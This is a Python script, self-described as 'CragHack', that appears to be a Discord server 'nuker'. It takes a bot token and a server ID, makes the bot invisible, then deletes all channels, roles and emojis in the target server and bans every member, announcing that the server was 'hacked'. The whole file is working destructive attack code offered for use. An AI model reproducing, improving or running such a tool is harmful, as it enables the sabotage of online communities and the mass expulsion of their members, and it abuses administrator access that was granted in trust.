import discord
import asyncio
import colorama
from colorama import Fore, Back, Style
import os
import time
from time import sleep

os.system("title CragHack by CraguS#7499")
intents = discord.Intents(messages=True, members = True, guilds=True)
client = discord.Client(intents=intents)
print(f"""

                    {Fore.RED}▄████▄  {Fore.GREEN} ██▀███  {Fore.BLUE} ▄▄▄      {Fore.YELLOW}  ▄████ {Fore.BLUE} ██░ ██ {Fore.GREEN} ▄▄▄      {Fore.RED} ▄████▄  {Fore.YELLOW} ██ ▄█▀
                    {Fore.RED}▒██▀ ▀█ {Fore.GREEN} ▓██ ▒ ██{Fore.BLUE}▒▒████▄   {Fore.YELLOW}  ██▒ ▀█{Fore.BLUE}▒▓██░ ██{Fore.GREEN}▒▒████▄   {Fore.RED} ▒██▀ ▀█ {Fore.YELLOW}  ██▄█▒ 
                    {Fore.RED}▒▓█     {Fore.GREEN} ▓██ ░▄█ {Fore.BLUE}▒▒██  ▀█▄ {Fore.YELLOW} ▒██░▄▄▄{Fore.BLUE}░▒██▀▀██{Fore.GREEN}░▒██  ▀█▄ {Fore.RED} ▒▓█    ▄{Fore.YELLOW} ▓███▄░ 
                    {Fore.RED}▒▓▓▄ ▄▄{Fore.GREEN}▒▒██▀▀█▄ {Fore.BLUE} ░██▄▄▄▄██{Fore.YELLOW} ░▓█  ██{Fore.BLUE}▓░▓█ ░██{Fore.GREEN} ░██▄▄▄▄██{Fore.RED} ▒▓▓▄ ▄██{Fore.YELLOW}▒▓██ █▄ 
                    {Fore.RED}▒ ▓███▀ {Fore.GREEN}░░██▓ ▒██{Fore.BLUE}▒ ▓█   ▓██{Fore.YELLOW}▒░▒▓███▀{Fore.BLUE}▒░▓█▒░██{Fore.GREEN}▓ ▓█   ▓██{Fore.RED}▒▒ ▓███▀ {Fore.YELLOW}░▒██▒ █▄
                    {Fore.RED}░ ░▒ ▒  {Fore.GREEN}░░ ▒▓ ░▒▓{Fore.BLUE}░ ▒▒   ▓▒█{Fore.YELLOW}░ ░▒   ▒{Fore.BLUE}  ▒ ░░▒░▒ {Fore.GREEN}▒▒   ▓▒█{Fore.RED}░░ ░▒ ▒  {Fore.YELLOW}░▒ ▒▒ ▓▒
                    {Fore.RED}░  ▒    {Fore.GREEN} ░▒ ░ ▒░ {Fore.BLUE} ▒   ▒▒ ░ {Fore.YELLOW} ░   ░  {Fore.BLUE}▒ ░▒░ ░  ▒{Fore.GREEN}   ▒▒ ░ {Fore.RED} ░  ▒   ░{Fore.YELLOW} ░▒ ▒░
                    {Fore.RED}░       {Fore.GREEN}   ░░   ░{Fore.BLUE}   ░   ▒  {Fore.YELLOW} ░ ░   ░{Fore.BLUE}  ░  ░░ ░{Fore.GREEN}  ░   ▒  {Fore.RED} ░       {Fore.YELLOW} ░ ░░ ░ 
                   {Fore.RED} ░ ░     {Fore.GREEN}    ░    {Fore.BLUE}       ░  {Fore.YELLOW}░      ░{Fore.BLUE}  ░  ░  ░{Fore.GREEN}      ░  {Fore.RED}░░ ░     {Fore.YELLOW}░  ░   
                    {Fore.RED}░       {Fore.GREEN}
                                                            
                                                                      

                                        {Fore.RED}A{Fore.GREEN}u{Fore.BLUE}t{Fore.YELLOW}h{Fore.RED}o{Fore.GREEN}r{Fore.BLUE}: {Fore.YELLOW}C{Fore.RED}r{Fore.GREEN}a{Fore.BLUE}g{Fore.YELLOW}u{Fore.RED}S{Fore.GREEN}#{Fore.BLUE}7{Fore.YELLOW}4{Fore.RED}9{Fore.GREEN}9
""")
try:
    TOKEN = input(f'                                        {Fore.WHITE}| {Fore.RED}Enter bot token {Fore.WHITE}| \n                      ')
    try:
        server_id = int(input(f'                                        {Fore.WHITE}| {Fore.RED}Enter Server ID {Fore.WHITE}| \n                                        '))
    except ValueError:
        print('Invalid Option')
        sleep(2)
        os.system("python ./123.py")
except Exception:
    os.system("python ./123.py")

ban_reason = input(f'                                       {Fore.WHITE}| {Fore.RED}Enter Ban Reason {Fore.WHITE}| \n                        ')

@client.event
async def on_ready():
    print()
    print(Fore.RED + '           ════════════════════════════════════════════════════════════════════════════════')
    print(Fore.GREEN + "                                      Logged in as: {name}".format(name=client.user.name, id=client.user.id))
    print(Fore.GREEN + f"                                      Permission Required: ADMINISTRATOR")
    print(Fore.GREEN + f"                                      Create by CraguS")
    print(Fore.RED + '           ════════════════════════════════════════════════════════════════════════════════')
    sleep(3)
    await client.change_presence(status=discord.Status.invisible)
    for guild in client.guilds:
        if guild.id == server_id:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print (f"[CHANNEL DELETED] {channel.name} in '{guild.name}'")
                except:
                    print (f"[CHANNEL NOT DELETED] {channel.name} in '{guild.name}'")
            for role in guild.roles:
                try:
                    await role.delete()
                    print (f"[ROLE DELETED] {role.name} in '{guild.name}'")
                except:
                    print (f"[ROLE NOT DELETED] {role.name} in '{guild.name}'")
            for member in guild.members:
                try:
                    await member.ban(reason=ban_reason)
                    #await guild.ban(member)
                    print (f"[BANNED] {member.name} in '{guild.name}'")
                except:
                    print (f"[FAIL BAN] {member.name} in '{guild.name}'")
            for emoji in guild.emojis:
                print(emoji)
                try:
                    await emoji.delete()
                    print (f"[EMOJI DELETED] {emoji.name} in '{guild.name}'")
                except:
                    print (f"[EMOJI NOT DELETED] {emoji.name} in '{guild.name}'")
            print(Fore.RED + '           ════════════════════════════════════════════════════════════════════════════════')
            print(Fore.GREEN + f"                                      Bot leaved the Server")
            print(Fore.GREEN + f"                                     Succesfully Server Hacked!")
            print(Fore.RED + '           ════════════════════════════════════════════════════════════════════════════════')
            #await guild.leave()
            break
    else:
        print('There was no task, the bot was not in the server provided.')

#@client.event
#async def on_guild_remove(self):
#    print('Bot was removed server')
#    print('Exiting the script')
#    print('------')

client.run(TOKEN)